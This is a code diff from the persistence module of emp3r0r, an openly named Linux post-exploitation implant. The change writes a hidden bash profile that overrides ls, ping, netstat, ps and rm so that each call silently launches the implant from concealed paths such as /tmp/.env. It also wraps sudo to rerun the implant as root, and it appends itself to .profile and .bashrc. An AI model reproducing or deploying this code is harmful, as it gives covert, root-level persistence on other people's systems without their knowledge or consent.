@@ -27,7 +27,7 @@ var (
 	EmpLocations = []string{"/tmp/.env", "/dev/shm/.env", "/env", fmt.Sprintf("%s/.env", os.Getenv("HOME")), "/usr/bin/.env", "/usr/local/bin/env", "/bin/.env"}
 
 	// call this to start emp3r0r
-	payload = strings.Join(EmpLocations, ">/dev/null 2>&1 || ") + ">/dev/null 2>&1"
+	payload = strings.Join(EmpLocations, " -silent=true -daemon=true || ") + " -silent=true -daemon=true"
 )
 
 // SelfCopy copy emp3r0r to multiple locations
@@ -79,16 +79,8 @@ func profiles() (err error) {
 	// source
 	sourceCmd := "source ~/.bashprofile"
 
-	// check if profiles are already written
-	data, err := ioutil.ReadFile(user.HomeDir + "/.bashrc")
-	if err != nil {
-		log.Println(err)
-		return
-	}
-	if strings.Contains(string(data), sourceCmd) {
-		err = errors.New("profiles: already written")
-		return
-	}
+	// set +m to silent job control
+	payload = "set +m;" + payload
 
 	// nologin users cannot do shit here
 	if strings.Contains(accountInfo["shell"], "nologin") ||
@@ -99,20 +91,21 @@ func profiles() (err error) {
 	}
 
 	// loader
-	loader := fmt.Sprintf("function ls() { `which ls` $@; (set +m;(%s)&) }", payload)
-	loader += fmt.Sprintf("\nfunction ping() { `which ping` $@; (set +m;(%s)&) }", payload)
-	loader += fmt.Sprintf("\nfunction netstat() { `which netstat` $@; (set +m;(%s)&) }", payload)
-	loader += fmt.Sprintf("\nfunction ps() { `which ps` $@; (set +m;(%s)&) }", payload)
-	loader += fmt.Sprintf("\nfunction rm() { `which rm` $@; (set +m;(%s)&) }", payload)
+	loader := fmt.Sprintf("\nfunction ls() { (set +m;(%s);); `which ls` $@; }", payload)
+	loader += "\nalias ls=ls"
+	loader += fmt.Sprintf("\nfunction ping() { (set +m;(%s)); `which ping` $@; }", payload)
+	loader += fmt.Sprintf("\nfunction netstat() { (set +m;(%s)); `which netstat` $@; }", payload)
+	loader += fmt.Sprintf("\nfunction ps() { (set +m;(%s)); `which ps` $@; }", payload)
+	loader += fmt.Sprintf("\nfunction rm() { (set +m;(%s)); `which rm` $@; }\n", payload)
 
 	// exec our payload as root too!
 	// sudo payload
 	var sudoLocs []string
 	for _, loc := range EmpLocations {
-		sudoLocs = append(sudoLocs, "sudo "+loc+"1>&2 2>/dev/null")
+		sudoLocs = append(sudoLocs, "`which sudo` -E "+loc+" -silent=true -daemon=true")
 	}
 	sudoPayload := strings.Join(sudoLocs, "||")
-	loader += fmt.Sprintf("\nsudo() { `which sudo` $@; (%s) }", sudoPayload)
+	loader += fmt.Sprintf("\nfunction sudo() { `which sudo` $@; (set +m;(%s)) }", sudoPayload)
 	err = ioutil.WriteFile(user.HomeDir+"/.bashprofile", []byte(loader), 0644)
 	if err != nil {
 		if !IsFileExist(user.HomeDir) {
@@ -126,6 +119,16 @@ func profiles() (err error) {
 		return
 	}
 
+	// check if profiles are already written
+	data, err := ioutil.ReadFile(user.HomeDir + "/.bashrc")
+	if err != nil {
+		log.Println(err)
+		return
+	}
+	if strings.Contains(string(data), sourceCmd) {
+		err = errors.New("profiles: already written")
+		return
+	}
 	// infect all profiles
 	_ = AppendToFile(user.HomeDir+"/.profile", sourceCmd)
 	_ = AppendToFile(user.HomeDir+"/.bashrc", sourceCmd)
